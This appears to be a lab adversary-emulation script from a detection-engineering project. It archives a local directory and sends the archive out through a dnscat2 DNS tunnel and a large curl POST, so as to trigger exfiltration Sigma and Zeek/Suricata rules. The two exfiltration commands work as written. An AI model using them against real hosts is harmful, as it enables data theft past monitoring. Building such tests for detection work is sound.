#!/usr/bin/env python3
"""
simulate_exfiltration.py

Generates data-exfiltration telemetry in an ISOLATED LAB NETWORK ONLY:
  1. Archives a test file on the local (target) host.
  2. Sends it out via a DNS-tunneling channel (requires a dnscat2 server
     already running on a lab-controlled listener host).
  3. Sends it out via a single large HTTP upload to a lab-controlled
     receiver, to exercise the "large outbound transfer" detection.

See scripts/README.md before running this. Replace every placeholder value
below with your own lab infrastructure.
"""

import argparse
import subprocess
import sys
import tarfile
from pathlib import Path

LAB_ONLY_WARNING = (
    "This script must only be run against infrastructure you own inside an "
    "isolated lab network. See scripts/README.md."
)


def confirm_lab_target() -> None:
    print(LAB_ONLY_WARNING)
    answer = input("Type 'yes' to continue: ").strip().lower()
    if answer != "yes":
        print("Aborted.")
        sys.exit(1)


def archive_test_data(source_dir: Path, archive_path: Path) -> None:
    print(f"[*] Archiving {source_dir} -> {archive_path}")
    with tarfile.open(archive_path, "w:gz") as tar:
        tar.add(source_dir, arcname=source_dir.name)


def exfiltrate_via_dns_tunnel(archive_path: Path, dnscat2_domain: str) -> None:
    """
    Requires a dnscat2 server already listening (lab-controlled) and the
    dnscat2 client installed. This streams the archive out in small
    base32-encoded chunks over DNS queries, which is what the
    exfiltration_dns_tunneling.yml Sigma rule is built to catch.
    """
    print(f"[*] Exfiltrating {archive_path} via DNS tunnel to {dnscat2_domain}")
    subprocess.run(
        ["dnscat2", "--dns", dnscat2_domain, "--file", str(archive_path)],
        check=False,
    )


def exfiltrate_via_large_upload(archive_path: Path, receiver_url: str) -> None:
    """
    Sends the archive as a single large HTTP POST to a lab-controlled
    receiver, to exercise the "archive then large outbound transfer"
    correlation rule.
    """
    print(f"[*] Exfiltrating {archive_path} via large HTTP upload to {receiver_url}")
    subprocess.run(
        ["curl", "-s", "-X", "POST", "--data-binary", f"@{archive_path}", receiver_url],
        check=False,
    )


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("source_dir", type=Path, help="Local test-data directory to archive")
    parser.add_argument("dnscat2_domain", help="Lab-controlled dnscat2 listener domain")
    parser.add_argument("receiver_url", help="Lab-controlled HTTP receiver URL for the large-upload test")
    args = parser.parse_args()

    confirm_lab_target()

    archive_path = Path("/tmp/exfil_test_archive.tar.gz")
    archive_test_data(args.source_dir, archive_path)
    exfiltrate_via_dns_tunnel(archive_path, args.dnscat2_domain)
    exfiltrate_via_large_upload(archive_path, args.receiver_url)

    print("[*] Done. Check Zeek/Suricata (Security Onion) and the exfiltration Sigma rules for alerts.")


if __name__ == "__main__":
    main()
